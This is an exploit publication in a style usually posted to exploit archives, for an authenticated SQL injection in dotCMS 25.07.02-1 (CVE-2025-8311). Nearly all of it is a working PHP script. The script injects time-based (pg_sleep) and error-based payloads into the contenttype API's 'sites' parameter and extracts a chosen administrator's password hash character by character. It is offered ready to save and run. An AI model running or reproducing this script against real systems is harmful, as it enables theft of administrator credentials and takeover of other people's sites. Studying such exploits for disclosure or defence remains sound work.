@@ -1,0 +1,260 @@
+=============================================================================================================================================
+| # Title     : dotCMS 25.07.02-1 Authenticated Blind SQL Injection (Time-Based)                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.dotcms.com/                                                                                                     |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/211125/ & 	CVE-2025-8311
+
+[+] Summary :  This PHP script represents a sophisticated dual-method SQL Injection exploit targeting DotCMS content management systems. 
+               The exploit combines Time-Based Blind SQLi and Error-Based SQLi techniques to extract password hashes from the database, specifically targeting administrator accounts.
+	
+[+]  Usage :   * : Save as: exploit.php
+                   Run    : php exploit.php
+	
+[+]  POC :	
+  
+<?php
+/*
+ PoC by Indoushka
+ */
+
+//=========================//
+// USER CONFIGURATION      //
+//=========================//
+$HOST          = "127.0.0.1:8443";
+$TARGET_ACCOUNT = "admin@dotcms.com";
+$TOKEN         = "REPLACE_WITH_VALID_JWT";   // <= أدخل توكن صحيح
+$SLEEP_TIME    = 10;                         // seconds
+
+//=========================//
+// Helper Functions        //
+//=========================//
+
+function hexEncode($str){
+    $out = "";
+    for($i = 0; $i < strlen($str); $i++){
+        $out .= sprintf("%%%02x", ord($str[$i]));
+    }
+    return $out;
+}
+
+function send_request($payload=""){
+    global $HOST, $TOKEN;
+
+    $payload = hexEncode($payload);
+    $url = "https://{$HOST}/api/v1/contenttype?filter=LCKwsF&page=774232&per_page=517532&orderby=wDdAmr&direction=DESC&type=DOTASSET&host=BBadoI&sites=PoC{$payload}";
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_HTTPHEADER => [
+            "Accept: */*",
+            "Authorization: Bearer {$TOKEN}",
+            "User-Agent: Mozilla/5.0"
+        ],
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 300
+    ]);
+
+    $start = microtime(true);
+    $resp  = curl_exec($ch);
+    $end   = microtime(true);
+    $delay = $end - $start;
+
+    curl_close($ch);
+    return [$resp, $delay];
+}
+
+function send_sqli($q){
+    $query = "') AND 1=(".$q.") AND ('A' LIKE 'A";
+    return send_request($query);
+}
+
+function test_sqli(){
+    global $SLEEP_TIME;
+
+    echo "[!] Checking connection...\n";
+    list($body, $delay) = send_request();
+    if(strpos($body, '"pagination":{"currentPage":') === false){
+        echo "[-] Unexpected response!\n";
+        exit;
+    }
+    echo "[+] Connection OK.\n";
+
+    echo "[!] Testing Time-Based SQL Injection...\n";
+    list($body, $delay) = send_sqli("SELECT 1 FROM pg_sleep({$SLEEP_TIME})");
+    if($delay < $SLEEP_TIME){
+        echo "[-] Sleep test failed.\n";
+        // لا نخرج من البرنامج، قد نجرب طريقة أخرى
+    } else {
+        echo "[+] Time-Based SQLi confirmed.\n\n";
+        return true;
+    }
+    
+    echo "[!] Testing Error-Based SQL Injection...\n";
+    $result = extract_error_test();
+    if($result){
+        echo "[+] Error-Based SQLi confirmed.\n\n";
+        return true;
+    }
+    
+    echo "[-] No SQL Injection vulnerability detected.\n";
+    exit;
+}
+
+function extract_error_test(){
+    global $TARGET_ACCOUNT;
+
+    $payload = "') AND (SELECT cast((SELECT 'test' FROM user_ LIMIT 1) as int)) AND ('A'='A";
+    list($resp, $delay) = send_request($payload);
+
+    if(preg_match('/invalid input syntax for type integer: "(.*?)"/', $resp, $m)){
+        return $m[1];
+    }
+    return false;
+}
+
+function extract_error_full(){
+    global $TARGET_ACCOUNT;
+
+    echo "[!] Attempting Error-Based extraction...\n";
+    
+    $payload = "') AND (SELECT cast((SELECT password_ FROM user_ WHERE emailaddress='{$TARGET_ACCOUNT}' LIMIT 1) as int)) AND ('A'='A";
+
+    list($resp, $delay) = send_request($payload);
+
+    // الالتقاط من رسالة الخطأ
+    if(preg_match('/invalid input syntax for type integer: "(.*?)"/', $resp, $m)){
+        return $m[1];
+    }
+    
+    // محاولة نمط آخر لرسالة الخطأ
+    if(preg_match('/ERROR: (.*?) at character/', $resp, $m)){
+        return $m[1];
+    }
+    
+    return false;
+}
+
+function retrieve_data_time_based($template, $charset){
+    global $SLEEP_TIME, $TARGET_ACCOUNT;
+
+    $charset = ":" . str_replace(":","",$charset);
+    $output = "";
+    $index = 1;
+
+    while(true){
+        $found = false;
+        foreach(str_split($charset) as $c){
+            $q = str_replace(["[_INDEX_PLACEHOLDER_]","[_ASCII_PLACEHOLDER_]"],
+                             [$index, ord($c)],
+                             $template);
+
+            list($body, $delay) = send_sqli($q);
+
+            if($delay >= intval($SLEEP_TIME/2)){
+                echo "[+] Found char at position {$index}: {$c}\n";
+                $output .= $c;
+                $index++;
+                $found = true;
+                break;
+            }
+        }
+        if(!$found){ break; }
+    }
+    return $output;
+}
+
+function retrieve_data_error_based($charset){
+    global $TARGET_ACCOUNT;
+    
+    $charset = ":" . str_replace(":","",$charset);
+    $output = "";
+    $index = 1;
+    
+    while(true){
+        $found = false;
+        foreach(str_split($charset) as $c){
+            // بناء استعلام Error-Based
+            $payload = "') AND (SELECT cast((SELECT substring(password_ from {$index} for 1) FROM user_ WHERE emailaddress='{$TARGET_ACCOUNT}' LIMIT 1) as int)) AND ('A'='A";
+            
+            list($resp, $delay) = send_request($payload);
+            
+            if(preg_match('/invalid input syntax for type integer: "('.$c.')"/', $resp, $m)){
+                echo "[+] Found char at position {$index}: {$c}\n";
+                $output .= $c;
+                $index++;
+                $found = true;
+                break;
+            }
+        }
+        if(!$found){ break; }
+    }
+    return $output;
+}
+
+//=========================//
+// MAIN                    //
+//=========================//
+
+echo "========================================\n";
+echo "     DotCMS SQL Injection Exploit      \n";
+echo "     Combined Time & Error Based       \n";
+echo "========================================\n\n";
+
+// اختبار وجود الثغرة
+if(!test_sqli()){
+    exit;
+}
+
+// محاولة الاستخراج السريع باستخدام Error-Based
+echo "[!] Trying Error-Based extraction first (faster)...\n";
+$hash_error = extract_error_full();
+
+if($hash_error){
+    echo "\n[✓] SUCCESS: Hash extracted via Error-Based SQLi\n";
+    echo "[+] HASH for {$TARGET_ACCOUNT}: {$hash_error}\n";
+    
+    // التحقق من صحة الهاش (اختياري)
+    if(strlen($hash_error) >= 32 && preg_match('/^[a-f0-9$.\/]+$/i', $hash_error)){
+        echo "[✓] Hash appears valid (length: " . strlen($hash_error) . " chars)\n";
+    }
+} else {
+    echo "[-] Error-Based extraction failed, falling back to Time-Based...\n\n";
+    
+    // استخدام الطريقة الزمنية كحل احتياطي
+    $template =
+    "SELECT (CASE WHEN (substring(password_ from [_INDEX_PLACEHOLDER_] for 1)=chr([_ASCII_PLACEHOLDER_])) ".
+    "THEN (SELECT 1 FROM pg_sleep(".intval($SLEEP_TIME/2).") WHERE emailaddress = '{$TARGET_ACCOUNT}') ".
+    "ELSE 1 END) FROM user_ WHERE emailaddress = '{$TARGET_ACCOUNT}'";
+
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$./:";
+    
+    echo "[!] Starting Time-Based extraction (slower)...\n";
+    echo "[!] This may take several minutes...\n";
+    
+    $pass = retrieve_data_time_based($template, $chars);
+    
+    if(!empty($pass)){
+        echo "\n[✓] SUCCESS: Hash extracted via Time-Based SQLi\n";
+        echo "[+] HASH for {$TARGET_ACCOUNT}: {$pass}\n";
+    } else {
+        echo "\n[-] FAILED: Could not extract hash using any method.\n";
+        echo "    Possible reasons:\n";
+        echo "    1. Account does not exist\n";
+        echo "    2. Different database structure\n";
+        echo "    3. Additional security measures\n";
+    }
+}
+
+echo "\n========================================\n";
+echo "               END OF EXPLOIT           \n";
+echo "========================================\n";
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
